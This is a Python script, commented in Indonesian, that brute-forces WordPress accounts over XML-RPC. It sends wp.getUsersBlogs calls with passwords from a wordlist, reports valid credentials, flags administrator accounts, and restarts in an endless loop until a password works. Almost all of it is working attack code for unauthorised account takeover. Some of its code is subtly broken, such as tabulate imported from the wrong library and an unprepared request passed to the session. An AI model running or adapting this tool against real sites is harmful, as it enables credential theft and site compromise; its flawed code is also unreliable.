import os
import random
import string
import time
import logging
from more_itertools import tabulate
import requests

from termcolor import colored
from concurrent.futures import ThreadPoolExecutor
import re
import argparse

# Definisikan variabel global
total = 0
correct_pairs = {}

# Inisialisasi logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Definisikan warna
YELLOW = 'yellow'
GREEN = 'green'
RED = 'red'

# Fungsi printout yang sesuai
def printout(text, color):
    print(colored(text, color))

def PasswordAttempt(user, password, url, thread_no, verbose, debug, agent):
    global correct_pairs
    if verbose is True or debug is True:
        if debug is True:
            thready = "[Thread " + str(thread_no) + "]"
            printout(thready, YELLOW)
        print("Trying " + user + " : " + password + "\n",)
    headers = {'User-Agent': agent,
               'Connection': 'keep-alive',
               'Accept': 'text/html'
               }
    post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + user + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
    try:
        req = requests.Request('POST', url, data=post, headers=headers)
        session = requests.Session()
        response = session.send(req, timeout=3)
        the_page = response.text
        look_for = "isAdmin"
        try:
            splitter = the_page.split(look_for, 1)[1]
            correct_pairs[user] = password
            print("--------------------------")
            success = "[" + user + " : " + password + "] are valid credentials!  "
            adminAlert = ""
            if splitter[23] == "1":
                adminAlert = "- THIS ACCOUNT IS ADMIN"
            printout(success, GREEN)
            printout(adminAlert, RED)
            print("\n--------------------------")
            return True, password
        except:
            pass
    except requests.exceptions.RequestException as e:
        printout(str(e), YELLOW)
        print(" - WAF or security plugin likely in use")
    except Exception as e:
        printout(str(e), YELLOW)
        print(" - An error occurred during the login attempt.")
        if verbose is True or debug is True:
            print(user + ":" + password + " was skipped")
    
    return False, None  # Tambahkan pengembalian ini untuk menangani kasus kegagalan

def is_strong_password(password):
    if len(password) < 8:
        return False
    if not any(char.isdigit() for char in password):
        return False
    if not any(char.isupper() for char in password):
        return False
    if not any(char.islower() for char in password):
        return False
    if not any(char in string.punctuation for char in password):
        return False
    return True

def generate_strong_password():
    uppercase_letters = string.ascii_uppercase
    lowercase_letters = string.ascii_lowercase
    digits = string.digits
    special_characters = string.punctuation
    
    all_characters = uppercase_letters + lowercase_letters + digits + special_characters
    strong_password = ''.join(random.choice(all_characters) for _ in range(12))  # Menghasilkan password 12 karakter
    
    return strong_password

def brute_force_single_wordlist(url, username, password_wordlist):
    results = []
    password_found = False

    passwords = read_password(password_wordlist)

    for password in passwords:
        success, password = PasswordAttempt(username, password, url, 1, verbose=False, debug=False, agent="Mozilla/5.0")
        if success:
            results.append((username, password, "Success"))
            password_found = True
            break

    return results, password_found

def brute_force_random_password(url, username):
    results = []
    password_found = False

    strong_password = generate_strong_password()

    success, password = PasswordAttempt(username, strong_password, url, 1, verbose=False, debug=False, agent="Mozilla/5.0")
    if success:
        results.append((username, password, "Success"))
        password_found = True

    return results, password_found

def brute_force(url, username, password_wordlists):
    results = []
    password_found = False

    if password_wordlists:
        for wordlist_file in password_wordlists:
            brute_force_results, password_found = brute_force_single_wordlist(url, username, wordlist_file)
            results.extend(brute_force_results)
            
            if password_found:
                break
    else:
        brute_force_results, password_found = brute_force_random_password(url, username)
        results.extend(brute_force_results)

    return results, password_found

def read_password(wordlist_file):
    with open(wordlist_file, 'r') as file:
        wordlist = file.read().splitlines()
    return wordlist

# Fungsi untuk memeriksa protokol dalam URL
def protocheck(url):
    url_pattern = re.compile(
        r"http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+"
    )
    if not url_pattern.match(url):
        printout("Incorrect URL. Please include the protocol in the URL.\n", YELLOW)
        return

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Brute force WordPress login.')
    parser.add_argument('-u', '--url', type=str, help='URL of the WordPress site', required=True)
    parser.add_argument('-us', '--username', type=str, help='WordPress username', required=True)
    parser.add_argument('-ps', '--password', type=str, help='WordPress password', required=True)
    parser.add_argument('-W', '--wordlist', type=str, help='Path to the wordlist file', required=True)
    args = parser.parse_args()

    # Masukkan URL dan username
    url = args.url
    username = args.username
    wordlist_files = [args.wordlist] if args.wordlist else []

    # Buat log file
    log_filename = "brute_force_log.txt"
    log_file = open(log_filename, "a")

    # Jalankan fungsi brute_force dengan URL, username, dan file wordlist yang diberikan
    start_time = time.time()
    while True:
        brute_force_results, password_found = brute_force(url, username, wordlist_files)
        if password_found:
            break
        else:
            print("No password found. Restarting brute force...")
            log_file.write("No password found. Restarting brute force...\n")
    end_time = time.time()

    # Tampilkan hasil dalam bentuk tabel
    table_headers = ["Username", "Password", "Status"]
    table_data = brute_force_results
    table = tabulate(table_data, headers=table_headers, tablefmt="fancy_grid")
    print(table)

    # Tampilkan nama wordlist yang digunakan
    if wordlist_files:
        print("\nWordlist used:")
        for file in wordlist_files:
            print(file)
    else:
        print("\nNo wordlist used. Generated a random strong password.")

    # Tampilkan waktu yang dibutuhkan
    execution_time = end_time - start_time
    print(f"\nExecution time: {execution_time:.2f} seconds")

    # Tulis waktu eksekusi ke log file
    log_file.write(f"\nExecution time: {execution_time:.2f} seconds\n")

    # Tutup log file
    log_file.close()

    # Tampilkan lokasi log file
    print(f"\nLog file saved: {os.path.abspath(log_filename)}")
